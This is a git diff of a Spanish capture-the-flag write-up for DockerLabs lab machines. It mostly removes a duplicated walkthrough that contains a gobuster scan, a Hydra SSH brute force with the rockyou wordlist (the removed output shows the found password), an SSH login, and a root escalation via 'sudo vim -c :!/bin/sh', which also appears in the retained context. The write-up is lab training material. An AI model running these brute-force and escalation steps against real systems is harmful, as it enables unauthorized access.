@@ -228,7 +228,7 @@ User russoski may run the following commands on 9cc448a7c0a7:
     (root) NOPASSWD: /usr/bin/vim
 ```
 Sabiendo que podemos ejecutar Vim[^1] con permisos de administrador, podemos buscar en [GTFOBins](https://gtfobins.github.io/gtfobins/vim/) alguna forma de establecer una shell remota, puesto que esta se ejecutará con los permisos del usuario que la haya lanzado. 
-![GTFOBins vim](https://github.com/JavieRR13/WriteUps/blob/6be73eb8c1de22d9b38e2720c90c945007edde78/DockerLabs/Muy%20f%C3%A1cil/Trust/Im%C3%A1genes/Trust_GTFOBinsvim.png)
+![GTFOBins vim](https://github.com/JavieRR13/WriteUps/blob/15cc9e2a9780218e32fb4a67bedf059c0229067a/DockerLabs/Muy%20f%C3%A1cil/Obsession/Im%C3%A1genes/Obsession_GTFOBinsvim.png)
 ```ruby
 russoski@9cc448a7c0a7:~$ sudo vim -c ':!/bin/sh'
 
@@ -265,98 +265,4 @@ root
 
 
 
-
-
-
-![Panel de Apache](https://github.com/JavieRR13/WriteUps/blob/1c1a5bf7b5a14bf09e12fc52180fde1e3514e8f0/DockerLabs/Muy%20f%C3%A1cil/Trust/Im%C3%A1genes/Trust_Apache.png)
-
-Tras acceder a la web nos encontramos con un panel de Apache por defecto del cual, a simple vista, no parece que vayamos a sacar mucho.  Como tampoco tenemos ningún usuario de sistema válido para intentar fuerza bruta sobre el servicio SSH, probaremos a buscar recursos, directorios o subdominios que pueda permanecer ocultos con la herramienta [gobuster](https://github.com/OJ/gobuster). 
-```java
-❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u 'http://172.18.0.2' -x .php,.py,.txt,.sh
-===============================================================
-Gobuster v3.8
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://172.18.0.2
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.8
-[+] Extensions:              php,py,txt,sh
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/secret.php           (Status: 200) [Size: 927]
-/server-status        (Status: 403) [Size: 275]
-Progress: 1038205 / 1038205 (100.00%)
-===============================================================
-Finished
-===============================================================
-```
-* Con dir indicamos que queremos el modo escaneo de directorios.
-* Con -w indicamos el diccionario a utilizar, en mi caso uno de [Seclists](https://github.com/danielmiessler/SecLists).
-* Con -u indicamos la url.
-* Con -x seleccionamos la extensión de archivos que queremos buscar.
-
-Podemos observar que, tras el escaneo que duró unos pocos segundos, se nos ha devuelto un status code 200 en el archivo *secret.php*. Con esto, nos dirigiremos al navegador para comprobar que es.
-![Mensaje](https://github.com/JavieRR13/WriteUps/blob/8f7742950694bd6cce9ba76009eb43a6e12d5b34/DockerLabs/Muy%20f%C3%A1cil/Trust/Im%C3%A1genes/Trust_Mensaje.png)
-Nos encontramos frente a una página en blanco con un mensaje con un nombre en el centro.  Además, inspeccionando el código fuente de la página no parece haber nada sospechoso, por lo que solo podemos interpretar que este nombre pueda ser un usuario válido de sistema y probarlo en el servicio SSH utilizando fuerza bruta con la herramienta [Hydra](https://github.com/vanhauser-thc/thc-hydra) y el diccionario de [rockyou](https://github.com/topics/rockyou-wordlist).
-```ruby
-❯ hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2
-Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-08 10:56:19
-[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
-[DATA] attacking ssh://172.18.0.2:22/
-[22][ssh] host: 172.18.0.2   login: mario   password: chocolate
-1 of 1 target successfully completed, 1 valid password found
-[WARNING] Writing restore file because 3 final worker threads did not complete until end.
-[ERROR] 3 targets did not resolve or could not be connected
-[ERROR] 0 target did not complete
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-08 10:56:28
-```
-* Con -l seleccionamos el usuario.
-* Con -P indicamos un conjunto de contraseñas a probar, en este caso, las recogidas en el diccionario.
-* Por último indicamos el servicio y la dirección sobre la que ejecutar el ataque.
-
-Vemos que este ataque ha sido satisfactorio y hemos encontrado una contraseña válida para el usuario *mario*.
-Ahora que ya tenemos usuario y contraseña accederemos al servicio SSH para comenzar con el escalado de privilegios.
-```ruby
-❯ ssh mario@172.18.0.2
-mario@172.18.0.2's password: 
-Linux 99ebdb36daec 6.12.38+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.38-1kali1 (2025-08-12) x86_64
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Wed Mar 20 09:54:46 2024 from 192.168.0.21
-mario@99ebdb36daec:~$ whoami
-mario
-```
-Una vez dentro de la máquina víctima, vamos a intentar listar todos los privilegios de sudo del usuario actual. Es decir, mostrar qué comandos puede ejecutar con sudo y cómo. 
-```ruby
-mario@99ebdb36daec:~$ sudo -l
-[sudo] password for mario: 
-Matching Defaults entries for mario on 99ebdb36daec:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
-
-User mario may run the following commands on 99ebdb36daec:
-    (ALL) /usr/bin/vim
-```
-Sabiendo que podemos ejecutar Vim[^1] con permisos de administrador, podemos buscar en [GTFOBins](https://gtfobins.github.io/gtfobins/vim/) alguna forma de establecer una shell remota, puesto que esta se ejecutará con los permisos del usuario que la haya lanzado. 
-![GTFOBins vim](https://github.com/JavieRR13/WriteUps/blob/6be73eb8c1de22d9b38e2720c90c945007edde78/DockerLabs/Muy%20f%C3%A1cil/Trust/Im%C3%A1genes/Trust_GTFOBinsvim.png)
-```ruby
-mario@99ebdb36daec:~$ sudo vim -c ':!/bin/sh'
-
-# whoami
-root
-# 
-```
 🥳CONSEGUIDO, SOMOS ROOT🥳
-[^1]: Vim es un editor de texto para sistemas Unix/Linux que, al poder ejecutarse con sudo, se convierte en una vía de escalada de privilegios porque permite lanzar comandos de sistema desde dentro del editor (por ejemplo con :!bash), lo que posibilita abrir una shell con permisos de root.
